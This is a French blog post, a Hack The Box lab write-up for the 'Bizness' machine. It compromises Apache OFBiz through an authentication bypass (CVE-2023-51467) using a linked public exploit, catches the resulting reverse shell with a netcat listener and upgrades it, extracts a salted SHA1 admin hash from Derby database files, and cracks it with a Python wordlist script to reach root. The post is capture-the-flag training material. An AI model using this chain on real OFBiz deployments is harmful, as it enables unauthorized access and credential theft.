<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Bizness</title>
<meta name=description content="Platforme: Hack The Box Lien: Bizness Niveau: Facile OS: Linux Lire cet article en anglais
Bizness présente une application web utilisant Apache OFBiz. En …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-bizness/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Bizness"><meta property="og:description" content="Platforme: Hack The Box Lien: Bizness Niveau: Facile OS: Linux Lire cet article en anglais
Bizness présente une application web utilisant Apache OFBiz. En …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Bizness/Bizness.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Bizness/Bizness.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Bizness"><meta name=twitter:description content="Platforme: Hack The Box Lien: Bizness Niveau: Facile OS: Linux Lire cet article en anglais
Bizness présente une application web utilisant Apache OFBiz. En …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-bizness/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-bizness/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Bizness/Bizness.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-bizness/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-bizness/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Bizness</h1><small role=doc-subtitle></small><p class=post-date>5 min read |
<span class=post-date>22 Mai 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Bizness>Bizness</a></li><li>Niveau: Facile</li><li>OS: Linux</li></ul><hr><p><a href=https://scorpiosec.com/posts/htb-bizness/>Lire cet article en anglais</a></p><p>Bizness présente une application web utilisant Apache OFBiz. En recherchant les vulnérabilités du logiciel, nous en identifions une qui permet aux attaquants de contourner l&rsquo;authentification. En tirant parti de cette faille, nous parvenons à accéder au système. Ensuite, nous découvrons un dossier pour Apache Derby qui contient de nombreux fichiers .dat. Notre tâche consiste à les passer au crible. Une simple commande nous permet de trouver un hash de mot de passe. Malheureusement, les méthodes de craquage courantes ne parviennent pas à le forcer. Afin d&rsquo;élever nos privilèges au niveau de root, nous changeons de tactique. Nous créons un script qui chiffre chaque ligne d&rsquo;une liste de mots et comparons les hashs obtenus à celui que nous avons. Une fois la correspondance trouvée, le mot de passe de root est révélé.</p><p>Adresse IP cible - <code>10.10.11.252</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Bizness 10.10.11.252
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Nmap 7.94SVN scan initiated Mon Mar  <span style=color:#d19a66>4</span> 14:20:48 <span style=color:#d19a66>2024</span> as: nmap -sC -sV -oA nmap/Bizness 10.10.11.252
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.252
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.046s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>997</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT    STATE SERVICE  VERSION
</span></span><span style=display:flex><span>22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 <span style=color:#56b6c2>(</span>protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp  open  http     nginx 1.18.0
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to https://bizness.htb/
</span></span><span style=display:flex><span>443/tcp open  ssl/http nginx 1.18.0
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>| tls-nextprotoneg: 
</span></span><span style=display:flex><span>|_  http/1.1
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>organizationName</span><span style=color:#56b6c2>=</span>Internet Widgits Pty Ltd/stateOrProvinceName<span style=color:#56b6c2>=</span>Some-State/countryName<span style=color:#56b6c2>=</span>UK
</span></span><span style=display:flex><span>| Not valid before: 2023-12-14T20:03:40
</span></span><span style=display:flex><span>|_Not valid after:  2328-11-10T20:03:40
</span></span><span style=display:flex><span>| tls-alpn: 
</span></span><span style=display:flex><span>|_  http/1.1
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to https://bizness.htb/
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span> at Mon Mar  <span style=color:#d19a66>4</span> 14:21:07 <span style=color:#d19a66>2024</span> -- <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 18.37 seconds
</span></span></code></pre></div><p>Notre scan révèle trois ports ouverts :</p><ul><li>Port 22/tcp : SSH (Secure Shell).</li><li>Port 80/tcp : HTTP avec nginx 1.18.0.</li><li>Port 443/tcp : SSL/HTTP (HTTPS) avec nginx 1.18.0.</li></ul><p>Nous avons aussi une redirection vers <code>bizness.htb</code>, que nous ajoutons à notre fichier <code>/etc/hosts</code> avec <code>sudo echo "10.10.11.252 bizness.htb" | sudo tee -a /etc/hosts</code>.</p><h2 id=enumération>Enumération</h2><p>À l&rsquo;adresse <code>https://bizness.htb/</code>, nous trouvons le site web d&rsquo;une entreprise proposant différents services.</p><p><img src=/images/HTB-Bizness/bizness-website.png alt="Bizness website"></p><p>En fin de page, on remarque que l&rsquo;application web utilise <code>Apache OFBiz</code>.</p><p><img src=/images/HTB-Bizness/pwrd-Apache-OFBiz.png alt="Footer info showing Apache OFBiz used"></p><p>Le site web n&rsquo;offre pas d&rsquo;autres informations utiles et nous passons donc au &ldquo;directory brute forcing&rdquo;.</p><p><img src=/images/HTB-Bizness/dirsearch1.png alt="Dirsearch results"></p><p><img src=/images/HTB-Bizness/dirsearch2.png alt="More dirsearch results"></p><p><code>/control</code> mène à une page d&rsquo;erreur.</p><p><img src=/images/HTB-Bizness/apache-OFBiz.png alt="Apache OFBiz error message"></p><blockquote><p>Apache OFBiz est un système de planification des ressources d&rsquo;entreprise open source. Il fournit une gamme d&rsquo;applications d&rsquo;entreprise qui intègrent et automatisent de nombreux processus d&rsquo;affaires d&rsquo;une entreprise.</p></blockquote><p>Nous allons ensuite à <code>/control/login</code> et trouvons une page de login.</p><p><img src=/images/HTB-Bizness/apacheOFBiz-login.png alt="Apache OFBiz login page"></p><h2 id=accès-initial>Accès initial</h2><p>Nous n&rsquo;avons pas d&rsquo;informations d&rsquo;identification à ce stade. En recherchant les vulnérabilités d&rsquo;Apache OFBiz et nous trouvons le <code>CVE-20023-51467</code>.</p><p><img src=/images/HTB-Bizness/CVE-2023-51467.png alt=CVE-2023-51467></p><p>Un exploit est disponible sur ce <a href=https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/tree/master>compte Github</a>. Le script <code>xdetection</code> permet de vérifier que la cible est effectivement vulnérable.</p><p><img src=/images/HTB-Bizness/ApacheOFBiz-vulnerable.png alt="CVE-2023-51467 test"></p><p>Nous mettons en place un listener netcat et exécutons le script d&rsquo;exploitation.</p><pre tabindex=0><code>nc -lvnp 4444
</code></pre><p><img src=/images/HTB-Bizness/exploit-script-ApacheOFBiz.png alt="Apache OFBiz exploitation"></p><p>Nous obtenons une connexion sur notre listeneer netcat!</p><p><img src=/images/HTB-Bizness/reverse-shell.png alt="Reverse shell"></p><p>Les commandes ci-dessous sont utilisées pour améliorer notre shell.</p><pre tabindex=0><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
</code></pre><p><img src=/images/HTB-Bizness/better-shell.png alt="Reverse shell"></p><p>Le drapeau de l&rsquo;utilisateur se trouve à <code>/home/ofbiz/user.txt</code>.</p><p><img src=/images/HTB-Bizness/user-flag.png alt="User flag"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Après avoir exploré le système, nous trouvons un hash de mot de passe dans <code>/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml</code> mais nous ne parvenons pas à le craquer.</p><p>En creusant un peu plus, nous trouvons un dossier appelé <code>derby</code>.</p><blockquote><p>Apache Derby est un système de gestion de base de données relationnelle développé par la Apache Software Foundation, qui peut être intégré dans des programmes Java et utilisé pour le traitement des transactions en ligne.</p></blockquote><p>Un fichier appelé <code>README_DO_NOT_TOUCH_FILES.txt</code> dans <code>/opt/ofbiz/runtime/data/derby/ofbiz/seg0</code> confirme qu&rsquo;il s&rsquo;agit bien du dossier de la base de données.</p><p><img src=/images/HTB-Bizness/derby-db.png alt="Apache derby database file"></p><p>Le répertoire <code>seg0</code> contient de nombreux fichiers <code>.dat</code>.</p><p><img src=/images/HTB-Bizness/dat-files.png alt=".dat files list"></p><p>Pour faciliter la recherche de contenu, nous les regroupons dans un seul fichier <code>.txt</code> que nous transférons sur notre machine locale.</p><pre tabindex=0><code>cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/* &gt; dat_files.txt
</code></pre><p>Sur notre machine locale, nous recherchons dans tous les fichiers <code>.dat</code> avec</p><pre tabindex=0><code>strings dat_files.txt | grep SHA
</code></pre><p>Un hachage est trouvé.</p><p><img src=/images/HTB-Bizness/hash1.png alt="hash found"></p><pre tabindex=0><code>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
</code></pre><p>Dans le même fichier, nous trouvons une ligne avec <code>admin</code> comme nom d&rsquo;utilisateur, ce qui suggère qu&rsquo;il s&rsquo;agit du hash du mot de passe de l&rsquo;administrateur. Mais nous ne sommes pas en mesure de craquer le hash. Nous disposons maintenant de deux hashs mais aucun moyen de les craquer.</p><p><img src=/images/HTB-Bizness/login-admin.png alt="admin username"></p><p>Nous procédons autrement, en chiffrant chaque ligne de la liste de mots <code>rockyou.txt</code> et en les comparant au dernier hash trouvé. La correspondance révélera le mot de passe.</p><blockquote><p>Vous pouvez consulter le <a href=https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java>code source</a> d&rsquo;Apache OFBiz pour voir comment les hashs sont générés.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>hashlib</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>base64</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>os</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>class</span> <span style=color:#e5c07b>PasswordEncryptor</span>:
</span></span><span style=display:flex><span>    <span style=color:#c678dd>def</span> <span style=color:#56b6c2;font-weight:700>__init__</span>(<span style=color:#e06c75>self</span>, <span style=color:#e06c75>hash_type</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;SHA&#34;</span>, <span style=color:#e06c75>pbkdf2_iterations</span><span style=color:#56b6c2>=</span><span style=color:#d19a66>10000</span>):
</span></span><span style=display:flex><span>        <span style=color:#e06c75>self</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>hash_type</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>hash_type</span>
</span></span><span style=display:flex><span>        <span style=color:#e06c75>self</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>pbkdf2_iterations</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>pbkdf2_iterations</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>crypt_bytes</span>(<span style=color:#e06c75>self</span>, <span style=color:#e06c75>salt</span>, <span style=color:#e06c75>value</span>):
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#56b6c2>not</span> <span style=color:#e06c75>salt</span>:
</span></span><span style=display:flex><span>            <span style=color:#e06c75>salt</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>base64</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>urlsafe_b64encode</span>(<span style=color:#e06c75>os</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>urandom</span>(<span style=color:#d19a66>16</span>))<span style=color:#56b6c2>.</span><span style=color:#e06c75>decode</span>(<span style=color:#98c379>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#e06c75>hash_obj</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>hashlib</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>new</span>(<span style=color:#e06c75>self</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>hash_type</span>)
</span></span><span style=display:flex><span>        <span style=color:#e06c75>hash_obj</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>update</span>(<span style=color:#e06c75>salt</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>encode</span>(<span style=color:#98c379>&#39;utf-8&#39;</span>))
</span></span><span style=display:flex><span>        <span style=color:#e06c75>hash_obj</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>update</span>(<span style=color:#e06c75>value</span>)
</span></span><span style=display:flex><span>        <span style=color:#e06c75>hashed_bytes</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>hash_obj</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>digest</span>()
</span></span><span style=display:flex><span>        <span style=color:#e06c75>result</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>f</span><span style=color:#98c379>&#34;$</span><span style=color:#98c379>{</span><span style=color:#e06c75>self</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>hash_type</span><span style=color:#98c379>}</span><span style=color:#98c379>$</span><span style=color:#98c379>{</span><span style=color:#e06c75>salt</span><span style=color:#98c379>}</span><span style=color:#98c379>$</span><span style=color:#98c379>{</span><span style=color:#e06c75>base64</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>urlsafe_b64encode</span>(<span style=color:#e06c75>hashed_bytes</span>)<span style=color:#56b6c2>.</span><span style=color:#e06c75>decode</span>(<span style=color:#98c379>&#39;utf-8&#39;</span>)<span style=color:#56b6c2>.</span><span style=color:#e06c75>replace</span>(<span style=color:#98c379>&#39;+&#39;</span>, <span style=color:#98c379>&#39;.&#39;</span>)<span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#e06c75>result</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Example usage:</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>hash_type</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;SHA1&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>salt</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;d&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>search</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>wordlist</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#39;/usr/share/wordlists/rockyou.txt&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Create an instance of the PasswordEncryptor class</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>encryptor</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>PasswordEncryptor</span>(<span style=color:#e06c75>hash_type</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Iterate through the wordlist and check for a matching password</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>with</span> <span style=color:#e5c07b>open</span>(<span style=color:#e06c75>wordlist</span>, <span style=color:#98c379>&#39;r&#39;</span>, <span style=color:#e06c75>encoding</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#39;latin-1&#39;</span>) <span style=color:#c678dd>as</span> <span style=color:#e06c75>password_list</span>:
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#e06c75>password</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>password_list</span>:
</span></span><span style=display:flex><span>        <span style=color:#e06c75>value</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>password</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>strip</span>()
</span></span><span style=display:flex><span>        <span style=color:#e06c75>hashed_password</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>encryptor</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>crypt_bytes</span>(<span style=color:#e06c75>salt</span>, <span style=color:#e06c75>value</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>encode</span>(<span style=color:#98c379>&#39;utf-8&#39;</span>))
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#e06c75>hashed_password</span> <span style=color:#56b6c2>==</span> <span style=color:#e06c75>search</span>:
</span></span><span style=display:flex><span>            <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#39;Password found: </span><span style=color:#98c379>{</span><span style=color:#e06c75>value</span><span style=color:#98c379>}</span><span style=color:#98c379>, hash: </span><span style=color:#98c379>{</span><span style=color:#e06c75>hashed_password</span><span style=color:#98c379>}</span><span style=color:#98c379>&#39;</span>)
</span></span><span style=display:flex><span>            <span style=color:#c678dd>break</span>
</span></span></code></pre></div><p>Après l&rsquo;exécution du script, nous trouvons le mot de passe <code>monkeybizness</code>.</p><p><img src=/images/HTB-Bizness/pwd-find.png alt="Password finder with Python"></p><p>Nous l&rsquo;utilisons pour nous connecter en tant que root avec <code>su root</code>.</p><p><img src=/images/HTB-Bizness/root-login.png alt="root login"></p><p>Et <code>root.txt</code> se trouve dans <code>/root</code>.</p><p><img src=/images/HTB-Bizness/root-flag.png alt="root flag"></p><p>Il est indéniable que la programmation fait de nous de meilleurs hackers, j&rsquo;encourage tout le monde à apprendre les bases de Python, Bash et Powershell pour être capable d&rsquo;écrire des scripts qui automatisent et facilitent certaines tâches. J&rsquo;espère que cet article vous a été utile!</p><p>Recommandations:</p><ul><li><a href="https://www.youtube.com/watch?v=XWuP5Yf5ILI&amp;t=1683s&amp;ab_channel=RyanJohn">Python for Hackers</a></li><li><a href="https://www.youtube.com/watch?v=YtKCoPvACVY&amp;ab_channel=RyanJohn">Bash for Bug Bounty & Ethical Hacking</a></li><li><a href="https://www.youtube.com/playlist?list=PL3NRVyAumvmppdfMFMUzMug9Cn_MtF6ub">PowerShell for Hackers playlist</a></li></ul></div><div class=prev-next><div class=next-post><p><a href=/fr/posts/htb-crafty/>Suivant:
HTB: Crafty
&#8594;</a></p><p class=next-post-date>juin 12, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès initial</a></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>